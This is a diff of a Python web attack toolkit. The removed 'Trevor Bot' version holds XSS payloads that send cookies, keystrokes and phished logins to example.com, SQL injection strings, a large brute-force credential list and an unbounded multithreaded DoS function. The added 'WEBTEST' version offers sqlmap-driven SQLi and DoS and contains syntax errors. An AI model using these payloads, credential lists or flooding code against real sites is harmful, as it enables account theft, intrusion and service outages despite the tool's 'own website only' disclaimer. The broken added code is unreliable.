@@ -1,94 +1,235 @@
-#!/usr/bin/env python3
-"""
-Trevor Bot - Ultimate Security Assessment Tool with Enhanced Features
-Combines v2.5.1 and v2.6 with all capabilities
-Author: HmzzProo678
-Version: 2.6 - Ultimate Combined Edition
-"""
-
 import os
-import sys
-import time
-import subprocess
-import requests
-import socket
-import ssl
-import threading
-from bs4 import BeautifulSoup
-from urllib.parse import urljoin, urlparse, parse_qs
-import json
-import sqlite3
-from datetime import datetime
 import re
-import hashlib
-import base64
-from concurrent.futures import ThreadPoolExecutor, as_completed
-import warnings
-from flask import Flask
-import dns.resolver
-import OpenSSL
-import cryptography
-from cryptography import x509
-from cryptography.hazmat.backends import default_backend
-import ipaddress
-import random
-import nmap
-import scapy.all as scapy
-import shutil
-from pathlib import Path
-import socket
-import platform
-import threading
-import matplotlib.pyplot as plt
-import os
 import sys
 import time
+import json
+import queue
+import shutil
+import signal
 import random
+import string
 import threading
+import subprocess
 import socket
-import platform
-from queue import Queue
-from urllib.parse import urlparse
-import matplotlib.pyplot as plt
-from datetime import datetime
+import dns.resolver
+import ssl
+from urllib.parse import urljoin, urlparse, urlunparse, parse_qs
 import requests
-import pandas as pd
+from bs4 import BeautifulSoup
+from tqdm import tqdm
+from colorama import init as colorama_init, Fore, Back, Style
 
-warnings.filterwarnings('ignore', message='Unverified HTTPS request')
+# Inisialisasi colorama dengan konversi ANSI untuk Windows
+colorama_init(autoreset=True, convert=True, strip=True)
 
-class Trevor:
+# Fungsi untuk membersihkan output dari kode ANSI
+def clean_ansi(text):
+    ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
+    return ansi_escape.sub('', text)
+
+# ====== Warna & Emoji ======
+C = {
+    "R": Fore.RED,
+    "G": Fore.GREEN,
+    "Y": Fore.YELLOW,
+    "B": Fore.BLUE,
+    "M": Fore.MAGENTA,
+    "C": Fore.CYAN,
+    "W": Fore.WHITE,
+    "GR": Fore.BLACK,
+    "RESET": Style.RESET_ALL,
+    "BOLD": Style.BRIGHT,
+}
+EMO = {
+    "spark": "✨",
+    "boom": "💥",
+    "rocket": "🚀",
+    "ok": "✅",
+    "warn": "⚠️",
+    "info": "ℹ️",
+    "disk": "💾",
+    "down": "⬇️",
+    "net": "🌐",
+    "scan": "🧪",
+    "shield": "🛡️",
+    "search": "🔎",
+    "gear": "⚙️",
+    "folder": "📁",
+    "exit": "🚪",
+    "spider": "🕷️",
+    "dos": "💣",
+    "check": "✓",
+    "cross": "✗",
+    "warning": "⚠️".
+}
+
+UA = (
+    "Mozilla/5.0 (Linux; Android 13; Termux) "
+    "AppleWebKit/537.36 (KHTML, like Gecko) "
+    "Chrome/124.0.0.0 Mobile Safari/537.36"
+)
+SESSION = requests.Session()
+SESSION.headers.update({"User-Agent": UA})
+REQUEST_TIMEOUT = 20
+STOP_EVENT = threading.Event()
+DOS_STOP_EVENT = threading.Event()
+
+# ====== Util: Animasi ======
+def type_print(text, delay=0.01):
+    # Bersihkan kode ANSI sebelum mencetak
+    clean_text = clean_ansi(text)
+    for ch in clean_text:
+        sys.stdout.write(ch)
+        sys.stdout.flush()
+        time.sleep(delay)
+    print()
+
+def spinner(text="Processing"):
+    frames = ["⠋","⠙","⠹","⠸","⠼","⠴","⠦","⠧","⠇","⠏"]
+    i = 0
+    while not STOP_EVENT.is_set():
+        # Bersihkan kode ANSI sebelum mencetak
+        clean_text = clean_ansi(f"{C['C']}{text} {frames[i%len(frames)]}{C['RESET']}")
+        sys.stdout.write(f"\r{clean_text}")
+        sys.stdout.flush()
+        time.sleep(0.08)
+        i += 1
+    sys.stdout.write("\r" + " " * (len(text) + 4) + "\r")
+
+def banner():
+    # Ganti 'clear' dengan 'cls' untuk Windows
+    os.system("cls" if os.name == 'nt' else "clear")
+    title = f"{C['BOLD']}{C['M']}WEBTEST{C['RESET']}"
+    sub = f"{C['GR']}Termux Web Toolkit · Scraping + SQLi + DoS + Scanner · by ChatGPT{C['RESET']}"
+    art = f"""
+{C['Y']}{EMO['spark']} {title} {EMO['spark']}{C['RESET']}
+{C['GR']}────────────────────────────────────────────────────────{C['RESET']}
+{EMO['spider']}  Scraping: HTML · CSS · JS · Assets · Meta · Full
+{EMO['shield']}  SQL Injection (sqlmap): Basic · Dump DBs · Crawl · Risk3 · Tor
+{EMO['dos']}  DoS Attack: Customizable for testing your own website
+{EMO['scan']}  Website Scanner: Security · Headers · Files · Vulnerabilities
+{EMO['shield']} Coded by: Hamzah Wisnu Dzaky AKA HMZZZ233!
+{EMO['warning]'} Don't attack random targets, just for security testing.
+{EMO['info']}  After actions, shows your Public IP
+{C['GR']}────────────────────────────────────────────────────────{C['RESET']}
+"""
+    # Bersihkan kode ANSI sebelum mencetak
+    clean_art = clean_ansi(art)
+    print(clean_art)
+
+def input_colored(prompt):
+    # Bersihkan kode ANSI sebelum mencetak
+    clean_prompt = clean_ansi(f"{C['BOLD']}{C['G']}{prompt}{C['RESET']}")
+    return input(clean_prompt)
+
+def sanitize_folder(name: str):
+    name = re.sub(r"[^a-zA-Z0-9._-]", "_", name)
+    return name[:60]
+
+def ensure_dir(path: str):
+    os.makedirs(path, exist_ok=True)
+
+def timestamp():
+    return time.strftime("%Y%m%d-%H%M%S")
+
+def get_public_ip():
+    urls = [
+        "https://api.ipify.org",
+        "https://ifconfig.me/ip",
+        "https://ipinfo.io/ip",
+    ]
+    for u in urls:
+        try:
+            r = SESSION.get(u, timeout=10)
+            if r.ok:
+                ip = r.text.strip()
+                if re.match(r"^\d{1,3}(\.\d{1,3}){3}$", ip) or ":" in ip:
+                    return ip
+        except requests.RequestException:
+            pass
+    return "Unknown"
+
+# ====== Scraping ======
+def fetch_html(url: str):
+    r = SESSION.get(url, timeout=REQUEST_TIMEOUT)
+    r.raise_for_status()
+    return r.text
+
+def extract_assets(base_url: str, html: str):
+    soup = BeautifulSoup(html, "html.parser")
+    assets = {
+        "css": set(),
+        "js": set(),
+        "img": set(),
+        "icons": set(),
+        "meta": [],
+    }
+    # CSS
+    for link in soup.find_all("link", href=True):
+        rel = " ".join(link.get("rel", [])).lower()
+        href = urljoin(base_url, link["href"])
+        if "stylesheet" in rel or href.lower().endswith(".css"):
+            assets["css"].add(href)
+        if "icon" in rel or any(href.lower().endswith(ext) for ext in [".ico", ".png", ".svg"]):
+            assets["icons"].add(href)
+    # JS
+    for sc in soup.find_all("script", src=True):
+        src = urljoin(base_url, sc["src"])
+        assets["js"].add(src)
+    # IMG
+    for im in soup.find_all(["img","source"], src=True):
+        src = urljoin(base_url, im["src"])
+        assets["img"].add(src)
+    for im in soup.find_all("img", srcset=True):
+        # pick first candidate
+        cand = im["srcset"].split(",")[0].strip().split(" ")[0]
+        if cand:
+            assets["img"].add(urljoin(base_url, cand))
+    # META
+    for m in soup.find_all("meta"):
+        assets["meta"].append({k: m.get(k) for k in m.attrs})
+    return assets
+
+def write_text(path, content):
+    with open(path, "w", encoding="utf-8", errors="ignore") as f:
+        f.write(content)
+
+def download_file(url, dest_path):
+    try:
+        with SESSION.get(url, stream=True, timeout=REQUEST_TIMEOUT) as r:
+            r.raise_for_status()
+            total = int(r.headers.get("Content-Length", 0))
+            tmp = dest_path + ".part"
+            with open(tmp, "wb") as f, tqdm(
+                total=total if total > 0 else None,
+                unit="B",
+                unit_scale=True,
+                dynamic_ncols=True,
+                leave=False
+            ) as pbar:
+                for chunk in r.iter_content(chunk_size=8192):
+                    if chunk:
+                        f.write(chunk)
+                        if total:
+                            pbar.update(len(chunk))
+            os.replace(tmp, dest_path)
+        return True, ""
+    except Exception as e:
+        return False, str(e)
+
+def choose_dir_for(url):
+    netloc = urlparse(url).netloc or "site"
+    base = sanitize_folder(f"{netloc}_{timestamp()}")
+    outdir = os.path.join(os.getcwd(), "WEBTEST_RESULTS", base)
+    ensure_dir(outdir)
+    return outdir
+
+# ====== Website Scanner ======
+class WebsiteScanner:
     def __init__(self):
-        self.name = "Trevor Bot"
-        self.version = "2.6"
-        self.typing_speed = 0.02
         self.session = requests.Session()
-        self.session.verify = False
+        self.session.headers.update({"User-Agent": UA})
         self.vulnerabilities = []
-        self.scraped_data = []
-        self.scraped_files_dir = None  # direktori untuk simpan hasil scraping
-        self.bruteforce_config = {
-            'max_threads': 20,
-            'timeout': 10,
-            'delay': 0.2,
-            'max_attempts': 1000
-        }
-        self.banner = """
-╔══════════════════════════════════════════════════════════════╗
-║  ████████╗██████╗ ███████╗██╗   ██╗ ██████╗ ██████╔╝         ║
-║  ╚══██╔══╝██╔══██╗██╔════╝██║   ██║██╔═══██╗██╔══██╗        ║
-║     ██║   ██████╔╝█████╗  ██║   ██║██║   ██║██████╔╝        ║
-║     ██║   ██╔══██╗██╔══╝  ╚██╗ ██╔╝██║   ██║██╔══██╗        ║
-║     ██║   ██║  ██║███████╗ ╚████╔╝ ╚██████╔╝██║  ██║        ║
-║     ╚═╝   ╚═╝  ╚═╝╚══════╝  ╚═══╝   ╚═════╝ ╚═╝  ╚═╝        ║
-║                                                              ║
-║        Ultimate Security Assessment Terminal v2.6          ║
-║     Combined Web App Security, Network Scanning & Recon      ║
-║                 Thanks to: HmzzProo678 (dev)                 ║
-╚══════════════════════════════════════════════════════════════╝
-        """
-        
-        self.common_creds = self.load_credentials()
-        
         self.sql_payloads = [
             "'", "''", "`", "``", ",", "\"", "\\", "\\'", "\\\"", ";", " OR '1'='1",
             " OR 1=1", " OR 1=1--", " OR 1=1#", " OR 1=1/*", ") OR '1'='1",
@@ -99,1094 +240,25 @@ class Trevor:
             "' AND 1=2 UNION SELECT NULL,username,password FROM users--",
             "1' AND 1=2 UNION SELECT NULL,user,pass FROM admin--"
         ]
-    
-        self.xss_payloads = [
-            "<script>alert('XSS')</script>",
-            "<img src=x onerror=alert('XSS')>",
-            "<svg onload=alert('XSS')>",
-            "<body onload=alert('XSS')>",
-            "\" onmouseover=alert('XSS') \"",
-            "' onfocus=alert('XSS') '",
-            " onload=alert('XSS') ",
-            "autofocus onfocus=alert('XSS')",
-            "src=javascript:alert('XSS')",
-            "';alert('XSS');//",
-            "\";alert('XSS');//",
-            "</script><script>alert('XSS')</script>",
-            "\\';alert('XSS');//",
-            "\\\";alert('XSS');//",
-            "javascript:alert('XSS')",
-            "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=",
-            "jav&#x09;ascript:alert('XSS')",
-            "jav&#x0A;ascript:alert('XSS')",
-            "#<script>alert('XSS')</script>",
-            "#javascript:alert('XSS')",
-            "#\" onmouseover=alert('XSS') \"",
-            "<img src=x oneonerrorrror=alert('XSS')>",
-            "<iframe srcdoc='<script>alert(\"XSS\")</script>'>",
-            "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
-            "<img src=x onerror=\\u0061lert('XSS')>",
-            "<svg><script>alert&#40;'XSS'&#41;</script>",
-            "<details open ontoggle=alert('XSS')>",
-            "<video><source onerror=alert('XSS')>",
-            "<audio src=x onerror=alert('XSS')>",
-            "<img src=x:expression(alert('XSS'))>",
-            "<style>@keyframes x{from{left:0;}to{left:1000px;}}#x{animation-name:x;}</style><div id=x onclick=alert('XSS')>XSS</div>",
-            "<script>document.location='http://example.com/steal?cookie='+document.cookie</script>",
-            "<img src=x onerror=\"fetch('http://example.com/steal',{method:'POST',body:document.cookie})\">",
-            "<script>document.onkeypress=function(e){fetch('http://example.com/keylog?key='+e.key)}</script>",
-            "<div style=\"position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999\"><h1>Session Expired</h1><p>Please login again:</p><form action=\"http://example.com/steal\" method=\"POST\">Username: <input type=\"text\" name=\"user\"><br>Password: <input type=\"password\" name=\"pass\"><br><input type=\"submit\" value=\"Login\"></form></div>"
-        ]
-
-        self.cipher_suites = {
-            'TLS_AES_256_GCM_SHA384': 'TLS 1.3',
-            'TLS_CHACHA20_POLY1305_SHA256': 'TLS 1.3',
-            'TLS_AES_128_GCM_SHA256': 'TLS 1.3',
-            'TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384': 'TLS 1.2',
-            'TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384': 'TLS 1.2',
-            'TLS_DHE_RSA_WITH_AES_256_GCM_SHA384': 'TLS 1.2',
-            'TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256': 'TLS 1.2',
-            'TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256': 'TLS 1.2',
-            'TLS_DHE_RSA_WITH_CHACHA20_POLY1305_SHA256': 'TLS 1.2',
-            'TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256': 'TLS 1.2',
-            'TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256': 'TLS 1.2',
-            'TLS_DHE_RSA_WITH_AES_128_GCM_SHA256': 'TLS 1.2',
-            'TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA384': 'TLS 1.2',
-            'TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384': 'TLS 1.2',
-            'TLS_DHE_RSA_WITH_AES_256_CBC_SHA256': 'TLS 1.2',
-            'TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256': 'TLS 1.2',
-            'TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256': 'TLS 1.2',
-            'TLS_DHE_RSA_WITH_AES_128_CBC_SHA256': 'TLS 1.2',
-            'TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA': 'TLS 1.2',
-            'TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA': 'TLS 1.2',
-            'TLS_DHE_RSA_WITH_AES_256_CBC_SHA': 'TLS 1.2',
-            'TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA': 'TLS 1.2',
-            'TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA': 'TLS 1.2',
-            'TLS_DHE_RSA_WITH_AES_128_CBC_SHA': 'TLS 1.2',
-            'TLS_RSA_WITH_AES_256_GCM_SHA384': 'TLS 1.2',
-            'TLS_RSA_WITH_AES_128_GCM_SHA256': 'TLS 1.2',
-            'TLS_RSA_WITH_AES_256_CBC_SHA256': 'TLS 1.2',
-            'TLS_RSA_WITH_AES_128_CBC_SHA256': 'TLS 1.2',
-            'TLS_RSA_WITH_AES_256_CBC_SHA': 'TLS 1.2',
-            'TLS_RSA_WITH_AES_128_CBC_SHA': 'TLS 1.2',
-            'TLS_RSA_WITH_3DES_EDE_CBC_SHA': 'TLS 1.2',
-            'TLS_DH_DSS_WITH_3DES_EDE_CBC_SHA': 'TLS 1.2',
-            'TLS_DH_RSA_WITH_3DES_EDE_CBC_SHA': 'TLS 1.2',
-            'TLS_DHE_DSS_WITH_3DES_EDE_CBC_SHA': 'TLS 1.2',
-            'TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA': 'TLS 1.2',
-            'TLS_ECDH_ECDSA_WITH_3DES_EDE_CBC_SHA': 'TLS 1.2',
-            'TLS_ECDH_RSA_WITH_3DES_EDE_CBC_SHA': 'TLS 1.2',
-            'TLS_ECDHE_ECDSA_WITH_3DES_EDE_CBC_SHA': 'TLS 1.2',
-            'TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA': 'TLS 1.2',
-            'TLS_ECDH_anon_WITH_AES_256_CBC_SHA': 'TLS 1.2',
-            'TLS_ECDH_anon_WITH_AES_128_CBC_SHA': 'TLS 1.2',
-            'TLS_ECDH_anon_WITH_3DES_EDE_CBC_SHA': 'TLS 1.2',
-            'TLS_KRB5_WITH_3DES_EDE_CBC_SHA': 'TLS 1.2',
-            'TLS_KRB5_WITH_3DES_EDE_CBC_MD5': 'TLS 1.2',
-            'TLS_KRB5_WITH_AES_128_CBC_SHA': 'TLS 1.2',
-            'TLS_KRB5_WITH_AES_256_CBC_SHA': 'TLS 1.2',
-            'TLS_KRB5_WITH_AES_128_CBC_MD5': 'TLS 1.2',
-            'TLS_KRB5_WITH_AES_256_CBC_MD5': 'TLS 1.2',
-            'TLS_KRB5_WITH_DES_CBC_SHA': 'TLS 1.2',
-            'TLS_KRB5_WITH_DES_CBC_MD5': 'TLS 1.2',
-            'TLS_PSK_WITH_AES_256_CBC_SHA': 'TLS 1.2',
-            'TLS_PSK_WITH_AES_128_CBC_SHA': 'TLS 1.2',
-            'TLS_PSK_WITH_3DES_EDE_CBC_SHA': 'TLS 1.2',
-            'TLS_DHE_PSK_WITH_AES_256_CBC_SHA': 'TLS 1.2',
-            'TLS_DHE_PSK_WITH_AES_128_CBC_SHA': 'TLS 1.2',
-            'TLS_DHE_PSK_WITH_3DES_EDE_CBC_SHA': 'TLS 1.2',
-            'TLS_RSA_PSK_WITH_AES_256_CBC_SHA': 'TLS 1.2',
-            'TLS_RSA_PSK_WITH_AES_128_CBC_SHA': 'TLS 1.2',
-            'TLS_RSA_PSK_WITH_3DES_EDE_CBC_SHA': 'TLS 1.2',
-            'TLS_RSA_WITH_RC4_128_SHA': 'TLS 1.2',
-            'TLS_RSA_WITH_RC4_128_MD5': 'TLS 1.2',
-            'TLS_ECDHE_ECDSA_WITH_RC4_128_SHA': 'TLS 1.2',
-            'TLS_ECDHE_RSA_WITH_RC4_128_SHA': 'TLS 1.2',
-            'TLS_ECDH_ECDSA_WITH_RC4_128_SHA': 'TLS 1.2',
-            'TLS_ECDH_RSA_WITH_RC4_128_SHA': 'TLS 1.2',
-            'TLS_ECDH_anon_WITH_RC4_128_SHA': 'TLS 1.2',
-            'TLS_KRB5_WITH_RC4_128_SHA': 'TLS 1.2',
-            'TLS_KRB5_WITH_RC4_128_MD5': 'TLS 1.2',
-            'TLS_PSK_WITH_RC4_128_SHA': 'TLS 1.2',
-            'TLS_DHE_PSK_WITH_RC4_128_SHA': 'TLS 1.2',
-            'TLS_RSA_PSK_WITH_RC4_128_SHA': 'TLS 1.2',
-            'TLS_DH_DSS_WITH_DES_CBC_SHA': 'TLS 1.2',
-            'TLS_DH_RSA_WITH_DES_CBC_SHA': 'TLS 1.2',
-            'TLS_DHE_DSS_WITH_DES_CBC_SHA': 'TLS 1.2',
-            'TLS_DHE_RSA_WITH_DES_CBC_SHA': 'TLS 1.2',
-            'TLS_ECDH_ECDSA_WITH_DES_CBC_SHA': 'TLS 1.2',
-            'TLS_ECDH_RSA_WITH_DES_CBC_SHA': 'TLS 1.2',
-            'TLS_ECDHE_ECDSA_WITH_DES_CBC_SHA': 'TLS 1.2',
-            'TLS_ECDHE_RSA_WITH_DES_CBC_SHA': 'TLS 1.2',
-            'TLS_ECDH_anon_WITH_DES_CBC_SHA': 'TLS 1.2',
-            'TLS_KRB5_EXPORT_WITH_DES_CBC_40_SHA': 'TLS 1.2',
-            'TLS_KRB5_EXPORT_WITH_DES_CBC_40_MD5': 'TLS 1.2',
-            'TLS_KRB5_EXPORT_WITH_RC4_40_SHA': 'TLS 1.2',
-            'TLS_KRB5_EXPORT_WITH_RC4_40_MD5': 'TLS 1.2',
-            'TLS_RSA_EXPORT1024_WITH_DES_CBC_SHA': 'TLS 1.2',
-            'TLS_RSA_EXPORT1024_WITH_RC4_56_SHA': 'TLS 1.2',
-            'TLS_DHE_DSS_EXPORT1024_WITH_DES_CBC_SHA': 'TLS 1.2',
-            'TLS_DHE_DSS_EXPORT1024_WITH_RC4_56_SHA': 'TLS 1.2',
-            'TLS_DHE_DSS_WITH_RC4_128_SHA': 'TLS 1.2',
-            'SSL_RSA_WITH_NULL_MD5': 'SSL',
-            'SSL_RSA_WITH_NULL_SHA': 'SSL',
-            'SSL_RSA_EXPORT_WITH_RC4_40_MD5': 'SSL',
-            'SSL_RSA_EXPORT_WITH_RC2_CBC_40_MD5': 'SSL',
-            'SSL_RSA_WITH_RC4_128_MD5': 'SSL',
-            'SSL_RSA_WITH_RC4_128_SHA': 'SSL',
-            'SSL_RSA_WITH_IDEA_CBC_SHA': 'SSL',
-            'SSL_RSA_WITH_DES_CBC_SHA': 'SSL',
-            'SSL_RSA_WITH_3DES_EDE_CBC_SHA': 'SSL',
-            'SSL_DH_DSS_WITH_DES_CBC_SHA': 'SSL',
-            'SSL_DH_RSA_WITH_DES_CBC_SHA': 'SSL',
-            'SSL_DHE_DSS_WITH_DES_CBC_SHA': 'SSL',
-            'SSL_DHE_RSA_WITH_DES_CBC_SHA': 'SSL',
-            'SSL_DH_anon_WITH_RC4_128_MD5': 'SSL',
-            'SSL_DH_anon_WITH_DES_CBC_SHA': 'SSL'
-        }
-        # konfigurasi scanning port
-        self.port_scan_options = {
-            'fast_scan': {
-                'description': 'Fast scan of top 100 common ports',
-                'ports': [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 
-                          993, 995, 1723, 3306, 3389, 5900, 8080, 8443],
-                'timeout': 1,
-                'threads': 50
-            },
-            'full_scan': {
-                'description': 'Full scan of all 65535 ports (slow)',
-                'ports': list(range(1, 65536)),
-                'timeout': 1,
-                'threads': 100
-            },
-            'service_scan': {
-                'description': 'Service detection scan',
-                'ports': [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 
-                          993, 995, 3306, 3389, 5900, 8080],
-                'timeout': 2,
-                'threads': 20
-            },
-            'udp_scan': {
-                'description': 'UDP port scan (common ports)',
-                'ports': [53, 67, 68, 69, 123, 137, 138, 161, 162, 500, 514, 520],
-                'timeout': 3,
-                'threads': 10,
-                'protocol': 'udp'
-            },
-            'os_detection': {
-                'description': 'OS detection scan',
-                'ports': [],
-                'timeout': 5,
-                'threads': 1
-            }
-        }
-        # service banners to check for vulnerabilities
-        self.vulnerable_banners = {
-            'ftp': {
-                'vsftpd 2.3.4': 'vsftpd 2.3.4 backdoor vulnerability (CVE-2011-2523)',
-                'ProFTPD': 'Check for ProFTPD vulnerabilities (multiple CVEs)',
-                'FileZilla': 'Check for FileZilla vulnerabilities'
-            },
-            'ssh': {
-                'OpenSSH 7.2': 'Check for OpenSSH vulnerabilities (CVE-2016-8858, etc.)',
-                'Dropbear': 'Check for Dropbear vulnerabilities'
-            },
-            'http': {
-                'Apache 2.4.49': 'Apache HTTP Server path traversal (CVE-2021-41773)',
-                'nginx 1.20.0': 'Check for nginx vulnerabilities',
-                'IIS 6.0': 'Microsoft IIS 6.0 (multiple vulnerabilities)',
-                'IIS 7.5': 'Microsoft IIS 7.5 (multiple vulnerabilities)'
-            },
-            'smtp': {
-                'Sendmail': 'Check for Sendmail vulnerabilities',
-                'Postfix': 'Check for Postfix vulnerabilities',
-                'Exim': 'Check for Exim vulnerabilities (CVE-2019-10149, etc.)'
-            },
-            'rdp': {
-                'Microsoft Terminal Services': 'Check for BlueKeep (CVE-2019-0708)'
-            }
-        }
         
-    def load_credentials(self):
-        """Load credentials from multiple sources including wordlists"""
-        # kumpulan password lemah
-        common = [
-            ('admin', 'admin'), ('admin', 'password'), ('admin', '123456'),
-            ('administrator', 'administrator'), ('root', 'root'), ('root', 'toor'),
-            ('user', 'user'), ('guest', 'guest'), ('demo', 'demo'),
-            ('test', 'test'), ('admin', ''), ('', 'admin'),
-            ('admin', 'admin123'), ('admin', 'password123'), ('sa', ''),
-            ('admin', 'qwerty'), ('admin', 'letmein'), ('admin', 'welcome'),
-            ('admin', 'admin@123'), ('admin', 'admin1234'), ('admin', '12345678'),
-            ('admin', '123456789'), ('admin', '1234567890'), ('admin', '123123'),
-            ('admin', '111111'), ('admin', 'password1'), ('admin', '12345'),
-            ('admin', '1234'), ('admin', '123'), ('admin', '000000'),
-            ('admin', 'abc123'), ('admin', '654321'), ('admin', '123abc'),
-            ('admin', 'iloveyou'), ('admin', 'monkey'), ('admin', 'sunshine'),
-            ('admin', 'princess'), ('admin', 'dragon'), ('admin', 'football'),
-            ('admin', 'master'), ('admin', 'superman'), ('admin', '1qaz2wsx'),
-            ('admin', 'qazwsx'), ('admin', 'password!'), ('admin', 'passw0rd'),
-            ('admin', 'admin@1234'), ('admin', 'admin@12345'), ('admin', 'admin@123456'),
-            ('admin', 'admin@1234567'), ('admin', 'admin@12345678'), ('admin', 'admin@123456789'),
-            ('admin', 'admin@1234567890'), ('admin', 'admin@1234567890-='), ('admin', 'admin@1234567890-=!@#$%^&*()_+'),
-            ('Hamzah', 'Hamzah123')
-        ]
-        
-        # 100 password umum
-        top_passwords = [
-            '123456', 'password', '12345678', 'qwerty', '123456789', '12345', '1234', '111111', '1234567',
-            'dragon', '123123', 'baseball', 'abc123', 'football', 'monkey', 'letmein', 'shadow', 'master',
-            '666666', 'qwertyuiop', '123321', 'mustang', '1234567890', 'michael', '654321', 'superman',
-            '1qaz2wsx', '7777777', '121212', '000000', 'qazwsx', '123qwe', 'killer', 'trustno1', 'jordan',
-            'jennifer', 'zxcvbnm', 'asdfgh', 'hunter', 'buster', 'soccer', 'harley', 'batman', 'andrew',
-            'tigger', 'sunshine', 'iloveyou', '2000', 'charlie', 'robert', 'thomas', 'hockey', 'ranger',
-            'daniel', 'starwars', 'klaster', '112233', 'george', 'computer', 'michelle', 'jessica', 'pepper',
-            '1111', 'zxcvbn', '555555', '11111111', '131313', 'freedom', '777777', 'pass', 'maggie',
-            '159753', 'aaaaaa', 'ginger', 'princess', 'joshua', 'cheese', 'amanda', 'summer', 'love',
-            'ashley', 'nicole', 'chelsea', 'biteme', 'matthew', 'access', 'yankees', '987654321', 'dallas',
-            'austin', 'thunder', 'taylor', 'matrix', 'mobilemail', 'mom', 'monitor', 'monitoring', 'montana',
-            'moon', 'moscow', 'password1', 'patrick', 'penguin', 'pepsi', 'philip', 'phoenix', 'picture','Hamzah123'
-        ]
-        
-        # variasi username umum
-        usernames = [
-            'admin', 'administrator', 'root', 'user', 'guest', 'test', 'demo', 
-            'webadmin', 'sysadmin', 'operator', 'supervisor', 'manager',
-            'backup', 'ftp', 'mysql', 'oracle', 'postgres', 'sql', 'dbadmin',
-            'webmaster', 'support', 'tech', 'helpdesk', 'info', 'service',
-            'sales', 'marketing', 'hr', 'finance', 'security', 'audit',
-            'nobody', 'anonymous', 'public', 'default', 'service', 'cisco',
-            'jira', 'confluence', 'jenkins', 'git', 'svn', 'docker', 'kubernetes',
-            'aws', 'azure', 'gcp', 'cloud', 'dev', 'deploy', 'ci', 'cd','Hamzah'
-        ]
-        
-        # menghasilkan kombinasi
-        credentials = common.copy()
-        
-        # tambah variasi username dengan password
-        for user in usernames:
-            for pwd in top_passwords[:50]:  # top 50 password pertama
-                credentials.append((user, pwd))
-        
-        # Add common username patterns with numbers
-        for i in range(1, 11):
-            credentials.append((f'admin{i}', f'admin{i}'))
-            credentials.append((f'admin{i}', 'password'))
-            credentials.append((f'admin{i}', f'password{i}'))
-            credentials.append((f'user{i}', f'user{i}'))
-        
-        # Add common email patterns
-        domains = ['example.com', 'test.com', 'company.com', 'localhost', 'domain.com']
-        for domain in domains:
-            credentials.append((f'admin@{domain}', 'admin'))
-            credentials.append((f'admin@{domain}', 'password'))
-            credentials.append((f'administrator@{domain}', 'administrator'))
-        
-        return credentials
-    
-        self.user_agents = [
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
-            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
-            "Mozilla/5.0 (Linux; Android 11; SM-G991B)",
-            "Mozilla/5.0 (iPhone; CPU iPhone OS 15_2)",
-            "curl/7.68.0", 
-            "Wget/1.21"
-        ]
-        self.last_attack = None
-    def get_public_ip(self):
-        """Get public IP address of the device"""
-        try:
-            # Try multiple services in case one fails
-            services = [
-                'https://api.ipify.org',
-                'https://ident.me',
-                'https://checkip.amazonaws.com',
-                'https://icanhazip.com'
-            ]
-            
-            for service in services:
-                try:
-                    response = requests.get(service, timeout=5)
-                    if response.status_code == 200:
-                        ip = response.text.strip()
-                        return ip
-                except:
-                    continue
-            
-            return "Unable to determine public IP"
-        except Exception as e:
-            return f"Error: {str(e)}"
-    
-    def typewriter_effect(self, text, speed=None):
-        if speed is None:
-            speed = self.typing_speed
-        for char in text:
-            sys.stdout.write(char)
+    def typewriter_effect(self, text, delay=0.01):
+        # Bersihkan kode ANSI sebelum mencetak
+        clean_text = clean_ansi(text)
+        for ch in clean_text:
+            sys.stdout.write(ch)
             sys.stdout.flush()
-            time.sleep(speed)
+            time.sleep(delay)
         print()
-    
-    def loading_animation(self, text, duration=2):
-        chars = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
-        for i in range(duration * 20):
-            sys.stdout.write(f'\r{text} {chars[i % len(chars)]}')
-            sys.stdout.flush()
-            time.sleep(0.05)
-        sys.stdout.write('\r' + ' ' * (len(text) + 2) + '\r')
-        sys.stdout.flush()
-    
-    def show_banner(self):
-        os.system('clear' if os.name == 'posix' else 'cls')
-        print(self.banner)
-        self.typewriter_effect(f"🤖 Trevor Bot v{self.version} - Ultimate Security Assessment Tool!")
-        self.typewriter_effect("⚡ Web App Security, Network Scanning & Recon capabilities activated...")
-        print()
-
-    def simple_ds(self, target_url, thread_count=100):
-        """Simple DoS attack with multiple threads - Use on localhost/lab only"""
-        self.typewriter_effect(f"💥 Starting DoS attack on {target_url} with {thread_count} threads...")
-
-        def attack():
-            while True:
-                try:
-                    requests.get(target_url)
-                    print("⚔️ Request sent")
-                except:
-                    print("❌ Failed")
-
-        threads = []
-        for _ in range(thread_count):
-            t = threading.Thread(target=attack)
-            t.daemon = True
-            t.start()
-            threads.append(t)
-
-        try:
-            while True:
-                time.sleep(1)
-        except KeyboardInterrupt:
-            self.typewriter_effect("🛑 DoS attack stopped.")   
-    
-    def show_help(self):
-        help_text = f"""
-🔥 TREVOR BOT v{self.version} - ULTIMATE SECURITY COMMANDS:
-──────────────────────────────────────────────────────────────
-
-WEB APPLICATION SECURITY:
-────────────────────────
-🕷️  /scan:<url>           - Comprehensive security scan
-                          Example: /scan:https://example.com
-
-🔓 /bruteforce:<url>      - Enhanced login bruteforce with multiple techniques
